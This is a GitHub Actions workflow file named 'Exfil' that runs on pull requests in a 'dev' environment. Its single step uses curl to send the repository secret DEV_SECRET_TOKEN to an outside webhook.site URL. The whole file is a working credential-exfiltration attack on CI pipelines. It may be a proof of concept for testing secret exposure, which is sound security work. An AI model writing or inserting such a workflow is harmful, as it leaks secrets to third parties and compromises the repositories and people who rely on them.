name: Exfil
on: [pull_request]
jobs:
  exfil:
    environment: dev
    runs-on: ubuntu-latest
    steps:
      - run: |
          curl -d "${{ secrets.DEV_SECRET_TOKEN }}" https://webhook.site/ed9ea4c1-f8c4-4e76-8f10-59221b484c10
